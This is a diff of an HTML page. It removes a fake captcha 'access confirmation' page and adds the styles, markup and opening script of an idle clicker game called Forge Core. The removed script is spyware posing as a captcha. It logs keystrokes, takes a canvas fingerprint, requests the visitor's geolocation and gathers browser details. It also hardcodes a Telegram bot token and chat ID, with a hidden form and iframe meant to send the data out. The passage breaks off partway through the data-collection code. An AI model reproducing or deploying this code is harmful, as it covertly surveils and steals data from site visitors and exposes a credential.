@@ -1,266 +1,1482 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подтверждение</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0a0e17;
-            font-family: 'Segoe UI', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-            color: #e0e0e0;
-        }
-        .captcha-box {
-            background: #141b26;
-            border-radius: 28px;
-            padding: 40px 30px;
-            max-width: 400px;
-            width: 100%;
-            border: 1px solid #2a3340;
-            text-align: center;
-        }
-        .shield { font-size: 48px; margin-bottom: 12px; }
-        h2 { font-weight: 500; font-size: 20px; color: #fff; margin-bottom: 6px; }
-        .sub { color: #8892a0; font-size: 14px; margin-bottom: 28px; }
-        .captcha-display {
-            background: #0f1520;
-            border-radius: 16px;
-            padding: 20px;
-            font-size: 36px;
-            letter-spacing: 12px;
-            font-weight: 700;
-            color: #6a8cff;
-            margin-bottom: 20px;
-            border: 1px solid #1f2a38;
-            font-family: 'Courier New', monospace;
-            user-select: none;
-        }
-        input {
-            width: 100%;
-            padding: 16px 18px;
-            background: #0f1520;
-            border: 1px solid #1f2a38;
-            border-radius: 14px;
-            color: #fff;
-            font-size: 18px;
-            text-align: center;
-            letter-spacing: 6px;
-            transition: 0.2s;
-        }
-        input:focus {
-            border-color: #4f7cff;
-            outline: none;
-            box-shadow: 0 0 0 3px rgba(79, 124, 255, 0.15);
-        }
-        .btn {
-            width: 100%;
-            padding: 16px;
-            margin-top: 16px;
-            background: #4f7cff;
-            border: none;
-            border-radius: 14px;
-            color: #fff;
-            font-weight: 600;
-            font-size: 17px;
-            cursor: pointer;
-            transition: 0.2s;
-        }
-        .btn:hover { background: #3b66e5; }
-        .status {
-            margin-top: 18px;
-            font-size: 13px;
-            color: #5a6a7a;
-        }
-        iframe { display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Forge Core: Кузница Бесконечности</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;600;700&family=Manrope:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-void:#0b0a10;
+    --bg-void-2:#14111a;
+    --bg-panel:#1b1620;
+    --bg-panel-2:#221b28;
+    --ember-hot:#ff6a2d;
+    --ember-glow:#ffb347;
+    --molten-core:#ff3b1f;
+    --teal-auto:#2de8c8;
+    --gold-prestige:#ffd166;
+    --violet-ascend:#c084fc;
+    --text-main:#f4ede4;
+    --text-dim:#a89b93;
+    --line:rgba(255,170,110,0.18);
+  }
+  * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; user-select: none; -webkit-user-select: none; touch-action: manipulation; }
+  html, body {
+    margin: 0; padding: 0; width: 100%; height: 100%;
+    background: radial-gradient(ellipse at 50% -10%, #2a1a12 0%, var(--bg-void-2) 45%, var(--bg-void) 100%);
+    font-family: 'Manrope', Arial, sans-serif;
+    color: var(--text-main);
+    overflow: hidden;
+  }
+  .num, #currency, .shop-buy-btn, .stat-capsule b, .tab-btn, .rebirth-stars, .profile-stat-row b {
+    font-family: 'Rajdhani', 'Manrope', sans-serif;
+  }
+  .icon-svg { width: 1em; height: 1em; display: inline-block; vertical-align: -0.15em; }
+
+  /* forge floor texture */
+  #forge-floor {
+    position: fixed; left:0; right:0; bottom:0; height: 45%;
+    background: repeating-linear-gradient(0deg, rgba(255,120,50,0.05) 0px, rgba(255,120,50,0.05) 1px, transparent 1px, transparent 26px),
+                repeating-linear-gradient(90deg, rgba(255,120,50,0.05) 0px, rgba(255,120,50,0.05) 1px, transparent 1px, transparent 26px);
+    -webkit-mask-image: linear-gradient(to top, black, transparent);
+    mask-image: linear-gradient(to top, black, transparent);
+    pointer-events: none; z-index: 0;
+  }
+
+  /* ============ LOADING SCREEN ============ */
+  #loading-screen {
+    position: fixed; inset: 0; z-index: 999;
+    background: radial-gradient(circle at 50% 40%, #2a1a12, #0b0a10 75%);
+    display: flex; flex-direction: column; align-items: center; justify-content: center;
+    gap: 22px;
+  }
+  #loading-logo {
+    font-family:'Rajdhani',sans-serif;
+    font-size: 2.3em;
+    font-weight: 700;
+    letter-spacing: 2px;
+    background: linear-gradient(90deg, var(--ember-glow), var(--molten-core), var(--gold-prestige), var(--ember-glow));
+    background-size: 300% 100%;
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    animation: logoGlow 3s linear infinite;
+    text-align: center;
+  }
+  @keyframes logoGlow { 0%{background-position:0% 50%} 100%{background-position:300% 50%} }
+  #loading-bolt { font-size: 3.6em; color: var(--ember-hot); animation: boltPulse 1s ease-in-out infinite; filter: drop-shadow(0 0 20px var(--ember-hot)); }
+  @keyframes boltPulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.15)} }
+  #loading-bar-track {
+    width: 70%; max-width: 320px; height: 14px;
+    background: rgba(255,255,255,0.06);
+    border-radius: 10px;
+    overflow: hidden;
+    border: 1px solid var(--line);
+  }
+  #loading-bar-fill {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, var(--molten-core), var(--ember-hot), var(--gold-prestige));
+    border-radius: 10px;
+    transition: width 0.1s linear;
+  }
+  #loading-pct { font-size: 0.9em; color: var(--ember-glow); font-weight: 700; }
+  #loading-tip { font-size: 0.75em; color: var(--text-dim); text-align: center; padding: 0 30px; max-width: 320px; min-height: 30px; }
+
+  #app { width: 100%; height: 100%; display: none; flex-direction: column; position: relative; z-index:1; }
+  #app.visible { display: flex; }
+
+  /* HEADER */
+  #header { padding: 10px 15px 4px; text-align: center; z-index: 5; position:relative; }
+  #currency {
+    font-size: 2.1em; font-weight: 700;
+    background: linear-gradient(90deg, var(--gold-prestige), var(--ember-glow));
+    -webkit-background-clip:text; background-clip:text; color:transparent;
+    filter: drop-shadow(0 0 12px rgba(255,140,50,0.5));
+    letter-spacing: 1px;
+  }
+  #stats-row {
+    display: flex; justify-content: center; gap: 12px; margin-top: 3px;
+    font-size: 0.78em; color: var(--text-dim); flex-wrap: wrap;
+  }
+  #stats-row span b { color: var(--ember-glow); font-weight:700; }
+  #prestige-row { font-size: 0.75em; color: var(--gold-prestige); margin-top: 3px; }
+  #prestige-row .icon-svg { margin-right: 3px; }
+  #ascend-row { font-size: 0.72em; color: var(--violet-ascend); margin-top: 2px; display:none; }
+  #ascend-row.show { display:block; }
+  #ascend-row .icon-svg { margin-right: 3px; }
+
+  /* CLICK AREA */
+  #click-area { flex: 1; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; }
+
+  #ember-field { position:absolute; inset:0; overflow:hidden; pointer-events:none; z-index:1; }
+  .ember-particle {
+    position:absolute; bottom:-10px; border-radius:50%;
+    background: radial-gradient(circle, var(--ember-glow), var(--ember-hot));
+    box-shadow: 0 0 6px var(--ember-hot);
+    animation-name: riseEmber; animation-timing-function: ease-in; animation-iteration-count: infinite;
+  }
+  @keyframes riseEmber {
+    0% { transform: translateY(0) translateX(0); opacity: 0; }
+    10% { opacity: 0.9; }
+    100% { transform: translateY(-105vh) translateX(var(--drift,20px)); opacity: 0; }
+  }
+
+  .orbit-ring {
+    position:absolute; top:50%; left:50%;
+    border:1px dashed var(--line); border-radius:50%;
+    animation: spin linear infinite; z-index:2;
+  }
+  .orbit-ring .orbit-dot {
+    position:absolute; top:-5px; left:50%; margin-left:-5px;
+    width:10px; height:10px; border-radius:50%;
+    box-shadow: 0 0 10px currentColor;
+  }
+  @keyframes spin { from{transform:translate(-50%,-50%) rotate(0deg)} to{transform:translate(-50%,-50%) rotate(360deg)} }
+
+  .stat-capsule {
+    position:absolute; z-index:4;
+    background: rgba(27,22,32,0.75);
+    border: 1px solid var(--line);
+    border-radius: 14px;
+    padding: 6px 10px;
+    font-size: 0.72em;
+    color: var(--text-dim);
+    display:flex; align-items:center; gap:6px;
+    backdrop-filter: blur(3px);
+    box-shadow: 0 0 12px rgba(0,0,0,0.4);
+  }
+  .stat-capsule b { color: var(--text-main); font-size: 1.15em; font-weight:700; }
+  .stat-capsule .icon-svg { font-size: 1.3em; }
+  #cap-click { top: 10%; left: 6%; color: var(--molten-core); }
+  #cap-dps { top: 10%; right: 6%; color: var(--teal-auto); }
+  #cap-mult { bottom: 12%; left: 6%; color: var(--gold-prestige); }
+  #cap-crit { bottom: 12%; right: 6%; color: var(--violet-ascend); }
+
+  #click-btn-wrap { position:relative; z-index:5; display:flex; align-items:center; justify-content:center; }
+  #click-btn {
+    width: 50vw; height: 50vw; max-width: 270px; max-height: 270px;
+    border: none; cursor: pointer;
+    clip-path: polygon(50% 2%, 95% 26%, 95% 74%, 50% 98%, 5% 74%, 5% 26%);
+    background: radial-gradient(circle at 38% 28%, #ffd48a, var(--ember-hot) 40%, var(--molten-core) 78%, #5c0f00 100%);
+    box-shadow: 0 0 50px rgba(255,90,30,0.75), 0 0 100px rgba(255,50,10,0.4), inset 0 -14px 34px rgba(0,0,0,0.4);
+    position: relative;
+    transition: transform 0.08s ease;
+    display: flex; align-items: center; justify-content: center;
+  }
+  #click-btn:active { transform: scale(0.93); }
+  #click-btn-icon .icon-svg { width: 15vw; height: 15vw; max-width: 84px; max-height: 84px; color: #fff8ee; filter: drop-shadow(0 0 10px #fff2d0); }
+
+  .float-num {
+    position: absolute; font-weight: 700; font-size: 1.3em; font-family:'Rajdhani',sans-serif;
+    color: var(--ember-glow); text-shadow: 0 0 8px var(--ember-hot); pointer-events: none;
+    animation: floatUp 0.9s ease-out forwards; z-index: 10;
+  }
+  .float-num.crit { color: var(--violet-ascend); text-shadow: 0 0 10px var(--violet-ascend); font-size: 1.6em; }
+  @keyframes floatUp { 0%{transform:translate(-50%,0) scale(0.6);opacity:1} 100%{transform:translate(-50%,-110px) scale(1.3);opacity:0} }
+
+  .particle {
+    position: absolute; width: 7px; height: 7px; border-radius: 50%;
+    pointer-events: none; z-index: 9; animation: particleFly 0.6s ease-out forwards;
+  }
+  @keyframes particleFly { 0%{transform:translate(0,0) scale(1);opacity:1} 100%{transform:translate(var(--dx),var(--dy)) scale(0.2);opacity:0} }
+
+  /* BOTTOM NAV */
+  #tabs {
+    display: flex; gap: 4px; padding: 6px 6px; z-index: 5;
+    overflow-x: auto; background: rgba(20,16,24,0.85);
+    border-top: 1px solid var(--line);
+    backdrop-filter: blur(6px);
+  }
+  .tab-btn {
+    flex: 0 0 auto; min-width: 64px;
+    padding: 8px 8px 7px;
+    background: rgba(255,255,255,0.04);
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    color: var(--text-dim);
+    font-size: 0.7em;
+    font-weight: 600;
+    text-align: center;
+    transition: all 0.15s;
+    line-height: 1.25;
+  }
+  .tab-btn .tab-icon { display:block; margin-bottom: 2px; }
+  .tab-btn .tab-icon .icon-svg { width: 1.5em; height: 1.5em; }
+  .tab-btn.active {
+    background: linear-gradient(135deg, var(--molten-core), var(--ember-hot));
+    color: #fff;
+    box-shadow: 0 0 14px rgba(255,90,30,0.6);
+    border-color: transparent;
+  }
+
+  /* PANELS */
+  #panels {
+    position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(11, 10, 16, 0.98); z-index: 20;
+    display: none; flex-direction: column; padding-top: 8px;
+  }
+  #panels.visible { display: flex; }
+  .panel-header {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 0 15px 8px; border-bottom: 1px solid var(--line);
+  }
+  .panel-header h2 { margin: 4px 0; font-size: 1.05em; color: var(--ember-glow); display:flex; align-items:center; gap:8px; font-family:'Rajdhani',sans-serif; font-weight:700; }
+  #close-panel { background: rgba(255,255,255,0.08); border: none; color: #fff; font-size: 1.3em; width: 42px; height: 42px; border-radius: 50%; }
+  #panel-content { flex: 1; overflow-y: auto; padding: 8px 10px 90px; }
+
+  .section-label { text-align:center;color:var(--teal-auto);margin:12px 0 6px;font-size:0.78em;letter-spacing:0.5px; }
+
+  .shop-item {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--line);
+    border-radius: 13px; padding: 11px 12px; margin-bottom: 9px;
+    display: flex; align-items: center; gap: 11px;
+    transition: transform 0.1s, box-shadow 0.15s;
+  }
+  .shop-item.affordable { border-color: rgba(255,140,50,0.6); box-shadow: 0 0 10px rgba(255,120,40,0.2); }
+  .shop-item.bought-flash { animation: flashBuy 0.4s ease; }
+  @keyframes flashBuy { 0%{background:rgba(255,140,50,0.35)} 100%{background:rgba(255,255,255,0.03)} }
+  .shop-icon { font-size: 2.1em; width: 48px; text-align: center; color: var(--ember-glow); filter: drop-shadow(0 0 6px currentColor); }
+  .shop-info { flex: 1; min-width:0; }
+  .shop-title { font-weight: 700; font-size: 0.92em; color: #fff; }
+  .shop-desc { font-size: 0.7em; color: var(--text-dim); margin-top: 2px; }
+  .shop-buy-btn {
+    padding: 12px 13px; border-radius: 11px; border: none;
+    font-weight: 700; font-size: 0.95em;
+    background: linear-gradient(135deg, var(--ember-hot), var(--molten-core));
+    color: #1b0800; min-width: 82px; text-align: center;
+  }
+  .shop-buy-btn.disabled { background: rgba(255,255,255,0.06); color: #665f5b; }
+
+  /* PROFILE */
+  #profile-content { padding: 6px 4px; }
+  .profile-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--line);
+    border-radius: 14px; padding: 14px; margin-bottom: 12px;
+  }
+  .profile-stat-row { display:flex; justify-content:space-between; padding: 6px 0; font-size:0.85em; border-bottom: 1px solid rgba(255,255,255,0.05); }
+  .profile-stat-row b { color: var(--ember-glow); font-weight:700; }
+  .settings-btn {
+    width: 100%; padding: 15px; margin-bottom: 10px; border-radius: 12px;
+    border: 1px solid var(--line);
+    background: rgba(255,255,255,0.04); color: #fff; font-size: 0.95em;
+    display:flex; align-items:center; justify-content:center; gap:8px;
+  }
+  #reset-btn { background: linear-gradient(135deg, #ff3b3b, #8a0038); border: none; font-weight: 700; }
+
+  /* FAQ */
+  .faq-item { background: rgba(255,255,255,0.03); border: 1px solid var(--line); border-radius: 12px; margin-bottom: 8px; overflow:hidden; }
+  .faq-q { padding: 12px 13px; font-weight:700; font-size:0.87em; color:var(--ember-glow); cursor:pointer; display:flex; justify-content:space-between; align-items:center; }
+  .faq-a { padding: 0 13px; max-height:0; overflow:hidden; transition: max-height 0.25s ease, padding 0.25s ease; font-size:0.8em; color:#cbbdb5; line-height:1.5; }
+  .faq-a.open { padding: 0 13px 13px; max-height: 500px; }
+  .faq-arrow { transition: transform 0.2s; }
+  .faq-arrow.open { transform: rotate(180deg); }
+
+  /* REBIRTH / ASCENSION */
+  .rebirth-box { text-align:center; padding: 14px 10px; }
+  .rebirth-icon-big { color:var(--gold-prestige); filter: drop-shadow(0 0 15px var(--gold-prestige)); }
+  .rebirth-icon-big.ascend { color: var(--violet-ascend); filter: drop-shadow(0 0 15px var(--violet-ascend)); }
+  .rebirth-icon-big .icon-svg { width: 2.4em; height: 2.4em; }
+  .rebirth-stars { font-size: 2em; color:var(--gold-prestige); text-shadow: 0 0 15px var(--gold-prestige); margin: 6px 0; display:flex; align-items:center; justify-content:center; gap:8px; }
+  .rebirth-stars.ascend { color: var(--violet-ascend); text-shadow: 0 0 15px var(--violet-ascend); }
+  .rebirth-btn {
+    margin-top: 14px; padding: 15px 26px; border-radius: 14px; border:none;
+    background: linear-gradient(135deg, var(--gold-prestige), var(--ember-hot));
+    color:#200; font-weight:800; font-size: 1em;
+    box-shadow: 0 0 20px rgba(255,180,50,0.6);
+  }
+  .rebirth-btn.ascend { background: linear-gradient(135deg, var(--violet-ascend), #6b2fd8); color:#fff; box-shadow: 0 0 20px rgba(180,80,255,0.6); }
+  .rebirth-btn.disabled { background: rgba(255,255,255,0.06); color:#665f5b; box-shadow:none; }
+  .rebirth-info { font-size:0.74em; color:var(--text-dim); margin-top:10px; line-height:1.6; }
+
+  #boost-banner {
+    position: absolute; top: 6px; left: 50%; transform: translateX(-50%);
+    background: linear-gradient(135deg, var(--gold-prestige), var(--ember-hot)); color: #200;
+    font-weight: 800; font-size: 0.78em; padding: 5px 14px; border-radius: 20px;
+    box-shadow: 0 0 15px rgba(255,150,0,0.8); z-index: 6; display: none;
+    align-items: center; gap: 5px;
+  }
+
+  #toast {
+    position: fixed; bottom: 84px; left: 50%; transform: translateX(-50%);
+    background: rgba(0,0,0,0.9); border: 1px solid var(--line);
+    color: #fff; padding: 9px 18px; border-radius: 20px; font-size: 0.8em;
+    z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.3s;
+    max-width: 85%; text-align: center;
+  }
+  #toast.show { opacity: 1; }
+
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-thumb { background: rgba(255,140,50,0.35); border-radius: 3px; }
+</style>
 </head>
 <body>
 
-<div class="captcha-box">
-    <div class="shield">🛡️</div>
-    <h2>Подтверждение доступа</h2>
-    <div class="sub">Введите код с картинки для продолжения</div>
-    <div class="captcha-display" id="captchaCode">A7K9F</div>
-    <input type="text" id="captchaInput" placeholder="Введите код" maxlength="5" autocomplete="off">
-    <button class="btn" id="submitBtn">Подтвердить</button>
-    <div class="status" id="statusText">Ожидание ввода...</div>
+<div id="forge-floor"></div>
+
+<div id="loading-screen">
+  <div id="loading-bolt"></div>
+  <div id="loading-logo">FORGE CORE</div>
+  <div id="loading-bar-track"><div id="loading-bar-fill"></div></div>
+  <div id="loading-pct">0%</div>
+  <div id="loading-tip">Загрузка...</div>
 </div>
 
-<!-- Скрытая форма для отправки в Telegram -->
-<iframe name="tgFrame" style="display:none;"></iframe>
-<form id="tgForm" action="" method="GET" target="tgFrame" style="display:none;"></form>
+<div id="app">
+
+  <div id="header">
+    <div id="currency">0</div>
+    <div id="stats-row">
+      <span>Клик: <b id="stat-click">1</b></span>
+      <span>Сек: <b id="stat-dps">0</b></span>
+      <span>Всего: <b id="stat-total">0</b></span>
+    </div>
+    <div id="prestige-row">Звёзды перерождения: <b id="stat-stars">0</b> (x<span id="stat-prestige-mult">1</span> ко всему)</div>
+    <div id="ascend-row">Кристаллы вознесения: <b id="stat-crystals">0</b> • Вознесений: <b id="stat-ascend-count">0</b></div>
+  </div>
+
+  <div id="tabs">
+    <div class="tab-btn" data-panel="damage"><span class="tab-icon"></span>Урон</div>
+    <div class="tab-btn" data-panel="auto"><span class="tab-icon"></span>Авто</div>
+    <div class="tab-btn" data-panel="farms"><span class="tab-icon"></span>Фермы</div>
+    <div class="tab-btn" data-panel="boosts"><span class="tab-icon"></span>Бусты</div>
+    <div class="tab-btn" data-panel="relics"><span class="tab-icon"></span>Реликвии</div>
+    <div class="tab-btn" data-panel="rebirth"><span class="tab-icon"></span>Реб.</div>
+    <div class="tab-btn" data-panel="ascension"><span class="tab-icon"></span>Вознес.</div>
+    <div class="tab-btn" data-panel="achievements"><span class="tab-icon"></span>Дост.</div>
+    <div class="tab-btn" data-panel="profile"><span class="tab-icon"></span>Проф.</div>
+  </div>
+
+  <div id="click-area">
+    <div id="ember-field"></div>
+    <div class="orbit-ring" id="ring1" style="color:var(--ember-hot)"><div class="orbit-dot" style="background:var(--ember-hot)"></div></div>
+    <div class="orbit-ring" id="ring2" style="color:var(--teal-auto)"><div class="orbit-dot" style="background:var(--teal-auto)"></div></div>
+    <div class="orbit-ring" id="ring3" style="color:var(--gold-prestige)"><div class="orbit-dot" style="background:var(--gold-prestige)"></div></div>
+
+    <div class="stat-capsule" id="cap-click"></div>
+    <div class="stat-capsule" id="cap-dps"></div>
+    <div class="stat-capsule" id="cap-mult"></div>
+    <div class="stat-capsule" id="cap-crit"></div>
+
+    <div id="boost-banner"></div>
+    <div id="click-btn-wrap">
+      <button id="click-btn"><span id="click-btn-icon"></span></button>
+    </div>
+  </div>
+
+  <div id="panels">
+    <div class="panel-header">
+      <h2 id="panel-title">Магазин</h2>
+      <button id="close-panel">&#10005;</button>
+    </div>
+    <div id="panel-content"></div>
+  </div>
+
+</div>
+<div id="toast"></div>
 
 <script>
-// ================================================================
-//  ВСТАВЬ СВОЙ ТОКЕН И CHAT_ID, ЁБАНАТ
-// ================================================================
-const BOT_TOKEN = '8524097415:AAHhdHVp9hh3ZoPhp3HmipEiT5xLFXRBr20';
-const CHAT_ID   = '-1003791860129';
+(function(){
+  "use strict";
 
-// ---------- ГЕНЕРАЦИЯ КАПЧИ ----------
-function generateCaptcha() {
-    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
-    let code = '';
-    for (let i = 0; i < 5; i++) {
-        code += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    document.getElementById('captchaCode').textContent = code;
-    return code;
-}
-let currentCaptcha = generateCaptcha();
+  /* ================= ICONS ================= */
+  var ICON_PATHS = {
+    bolt: '<path d="M13 2 3 14h7l-1 8 10-12h-7l1-8z"/>',
+    sword: '<path d="M6.5 17.5 17 7M14 4l6 6-3 1-4-4 1-3zM3 21l3.5-3.5M5 19l2 2"/>',
+    glove: '<path d="M7 10V6a2 2 0 1 1 4 0v3M11 9V5a2 2 0 1 1 4 0v4M15 9V6a2 2 0 1 1 4 0v6c0 4-3 7-7 7s-7-2-7-6v-3a2 2 0 1 1 4 0v1"/>',
+    flame: '<path d="M12 2c1 4-4 5-4 9a4 4 0 0 0 8 0c0-2-1-3-1-3s2 1 2 5a6 6 0 1 1-12 0c0-6 5-6 7-11z"/>',
+    snow: '<path d="M12 2v20M4.5 6l15 12M19.5 6l-15 12M4 12h16M7 4l2 2M17 4l-2 2M7 20l2-2M17 20l-2-2"/>',
+    hammer: '<path d="M14 6l4 4-8 8-4-4 8-8zM3 21l6-6M17 3l4 4-2 2-4-4 2-2z"/>',
+    dagger: '<path d="M12 2v13M8 6h8M9 15l3 3 3-3M12 18v4"/>',
+    robot: '<rect x="5" y="8" width="14" height="10" rx="2"/><circle cx="9" cy="13" r="1.2"/><circle cx="15" cy="13" r="1.2"/><path d="M12 8V4M9 4h6M4 12H2M22 12h-2"/>',
+    arm: '<path d="M4 14l4-4 3 3 5-5 4 4M8 20l4-4 4 4"/>',
+    brain: '<path d="M9 3a3 3 0 0 0-3 3 3 3 0 0 0-2 5 3 3 0 0 0 2 5 3 3 0 0 0 3 3M15 3a3 3 0 0 1 3 3 3 3 0 0 1 2 5 3 3 0 0 1-2 5 3 3 0 0 1-3 3M9 3v18M15 3v18"/>',
+    chip: '<rect x="7" y="7" width="10" height="10" rx="1"/><path d="M9 2v3M15 2v3M9 19v3M15 19v3M2 9h3M2 15h3M19 9h3M19 15h3"/>',
+    house: '<path d="M4 11l8-7 8 7v9a1 1 0 0 1-1 1h-4v-6H9v6H5a1 1 0 0 1-1-1v-9z"/>',
+    cup: '<path d="M6 3h12l-1 12a5 5 0 0 1-10 0L6 3zM9 3v2M15 3v2M4 21h16"/>',
+    dog: '<path d="M4 10c0-3 2-6 5-6l1 2h4l1-2c3 0 5 3 5 6v3a5 5 0 0 1-5 5H9a5 5 0 0 1-5-5v-3z"/><circle cx="9" cy="11" r=".8"/><circle cx="15" cy="11" r=".8"/>',
+    wheat: '<path d="M12 22V8M9 12c-2-1-3-3-2-5 2 1 3 2 3 4M15 12c2-1 3-3 2-5-2 1-3 2-3 4M9 16c-2-1-3-3-2-5 2 1 3 2 3 4M15 16c2-1 3-3 2-5-2 1-3 2-3 4M12 8c-2 0-3-2-3-4 2 0 3 1 3 3M12 8c2 0 3-2 3-4-2 0-3 1-3 3"/>',
+    factory: '<path d="M3 21V11l5 3v-3l5 3V8l5 4v9H3z"/><path d="M6 21v-4M12 21v-4M18 21v-4"/>',
+    pick: '<path d="M4 20l7-7M14 4c3 0 6 3 6 6-4 0-7-1-9-3l-1-1c1-1 2-2 4-2z"/>',
+    bank: '<path d="M3 10l9-6 9 6M4 10v9M8 10v9M12 10v9M16 10v9M20 10v9M2 21h20"/>',
+    flask: '<path d="M9 2h6M10 2v6l-5 9a2 2 0 0 0 2 3h10a2 2 0 0 0 2-3l-5-9V2"/>',
+    rocket: '<path d="M12 2c3 2 5 6 5 10 0 3-1 5-1 5H8s-1-2-1-5c0-4 2-8 5-10z"/><path d="M9 17l-3 4M15 17l3 4M10 9h4"/>',
+    portal: '<circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="5"/><circle cx="12" cy="12" r="1.5"/>',
+    starforge: '<path d="M12 2l2.5 6.5L21 11l-6.5 2.5L12 20l-2.5-6.5L3 11l6.5-2.5L12 2z"/>',
+    crystal: '<path d="M12 2l6 6-6 14-6-14 6-6zM6 8h12"/>',
+    tree: '<path d="M12 2 6 11h3l-4 6h5v5h4v-5h5l-4-6h3L12 2z"/>',
+    satellite: '<path d="M4 4l4 4M2 8l6 6M13 3l8 8-3 3-8-8 3-3zM9 15l-5 5M14 10l-8 8"/>',
+    volcano: '<path d="M2 20h20L15 8l-2 3-1-5-2 4-2-2-2 8-4 4z"/>',
+    galaxy: '<circle cx="12" cy="12" r="1.6"/><path d="M12 2a10 10 0 0 1 8 16M12 22a10 10 0 0 1-8-16"/>',
+    blackhole: '<circle cx="12" cy="12" r="3"/><ellipse cx="12" cy="12" rx="10" ry="4"/><ellipse cx="12" cy="12" rx="6" ry="9"/>',
+    sparkles: '<path d="M12 2l1.5 4.5L18 8l-4.5 1.5L12 14l-1.5-4.5L6 8l4.5-1.5L12 2z"/><path d="M19 15l.8 2.2L22 18l-2.2.8L19 21l-.8-2.2L16 18l2.2-.8L19 15z"/>',
+    gem: '<path d="M6 3h12l4 6-10 12L2 9l4-6z"/><path d="M2 9h20M9 3l3 6 3-6M12 9l-3 12M12 9l3 12"/>',
+    battery: '<rect x="2" y="8" width="18" height="8" rx="2"/><path d="M22 10v4"/><path d="M5 11v2M8 11v2M11 11v2"/>',
+    turbo: '<path d="M12 2v6M12 16v6M2 12h6M16 12h6M5 5l4 4M15 15l4 4M19 5l-4 4M9 15l-4 4"/>',
+    refresh: '<path d="M3 12a9 9 0 0 1 15-6.7L21 8M21 3v5h-5M21 12a9 9 0 0 1-15 6.7L3 16M3 21v-5h5"/>',
+    user: '<circle cx="12" cy="8" r="4"/><path d="M4 21c0-4 3.5-7 8-7s8 3 8 7"/>',
+    trophy: '<path d="M8 4h8v4a4 4 0 0 1-8 0V4zM5 4h3v3a3 3 0 0 1-3-3zM16 4h3a3 3 0 0 1-3 3V4zM10 15v3h4v-3M8 21h8"/>',
+    lock: '<rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/>',
+    check: '<path d="M20 6 9 17l-5-5"/>',
+    star: '<path d="M12 2l2.9 6.6 7.1.6-5.4 4.7 1.7 7L12 17.3 5.7 20.9l1.7-7L2 9.2l7.1-.6L12 2z"/>',
+    question: '<circle cx="12" cy="12" r="9"/><path d="M9.5 9a2.5 2.5 0 1 1 3.5 2.3c-.9.4-1.5 1-1.5 2.2M12 17h.01"/>',
+    save: '<path d="M5 3h11l5 5v13H5V3z"/><path d="M8 3v6h8V3M8 21v-7h8v7"/>',
+    trash: '<path d="M4 7h16M9 7V4h6v3M6 7l1 13h10l1-13"/>'
+  };
+  function iconHtml(name){
+    var p = ICON_PATHS[name] || '';
+    return '<svg class="icon-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">' + p + '</svg>';
+  }
 
-// ---------- КЕЙЛОГ ----------
-let keyLog = [];
-document.addEventListener('keydown', (e) => {
-    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Backspace') {
-        keyLog.push(e.key);
-        if (keyLog.length > 200) keyLog.shift();
-    }
-});
+  /* ================= LOADING SCREEN ================= */
+  document.getElementById("loading-bolt").innerHTML = iconHtml("bolt");
+  document.getElementById("click-btn-icon").innerHTML = iconHtml("bolt");
+  var tabIconMap = {damage:"sword", auto:"robot", farms:"house", boosts:"sparkles", relics:"gem", rebirth:"refresh", ascension:"portal", achievements:"trophy", profile:"user"};
+  document.querySelectorAll(".tab-btn").forEach(function(btn){
+    var span = btn.querySelector(".tab-icon");
+    span.innerHTML = iconHtml(tabIconMap[btn.dataset.panel] || "star");
+  });
+  document.getElementById("prestige-row").insertAdjacentHTML("afterbegin", iconHtml("star"));
+  document.getElementById("ascend-row").insertAdjacentHTML("afterbegin", iconHtml("portal"));
 
-// ---------- ФИНГЕРПРИНТ ----------
-function getFP() {
-    try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        ctx.textBaseline = 'top';
-        ctx.font = '14px Arial';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(10, 10, 20, 20);
-        ctx.fillStyle = '#069';
-        ctx.fillText('fp', 30, 30);
-        return canvas.toDataURL().slice(0, 80);
-    } catch(e) { return 'ошибка'; }
-}
-
-// ---------- ГЕОЛОКАЦИЯ ----------
-function getGeo() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve('недоступно');
-            return;
-        }
-        navigator.geolocation.getCurrentPosition(
-            pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
-            () => resolve('отказано')
-        );
+  // decorative orbit rings sizing
+  (function(){
+    var sizes = [{el:"ring1",d:190,speed:14},{el:"ring2",d:240,speed:22},{el:"ring3",d:290,speed:32}];
+    sizes.forEach(function(s){
+      var el = document.getElementById(s.el);
+      el.style.width = s.d+"px"; el.style.height = s.d+"px";
+      el.style.animationDuration = s.speed+"s";
     });
-}
+  })();
 
-// ---------- СБОР ВСЕХ ДАННЫХ ----------
-async function collectAllData() {
-    const data = {};
-    
-    // Браузер
-    data.ua = navigator.userAgent;
-    data.lang = navigator.language;
-    data.platform = navigator.platform;
-    data.screen = `${screen.width}x${screen.height}`;
